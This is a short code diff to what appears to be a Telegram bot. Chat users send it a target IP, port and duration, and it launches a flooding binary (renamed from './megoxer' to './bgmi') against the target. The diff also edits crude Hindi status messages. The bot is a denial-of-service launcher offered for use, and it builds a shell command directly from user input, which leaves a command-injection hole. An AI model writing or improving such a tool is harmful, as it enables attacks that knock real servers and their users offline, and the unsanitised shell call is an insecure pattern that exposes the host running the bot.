@@ -162,7 +162,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*✅ ATTACK LAG GAYA ANDHAA HAI KYA LAUDE✅*\n\n"
         f"*🎯 TARGET CHUT:* {ip}\n"
         f"*🔌 LAND KHADA HAI:* {port}\n"
-        f"*⏱ NIKAL GAYA KYA:* {time} seconds\n"
+        f"*⏱ NIKAL GAYA KYA LAUDE:* {time} seconds\n"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, time, context))
@@ -174,7 +174,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {time}",
+            f"./bgmi {ip} {port} {time} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
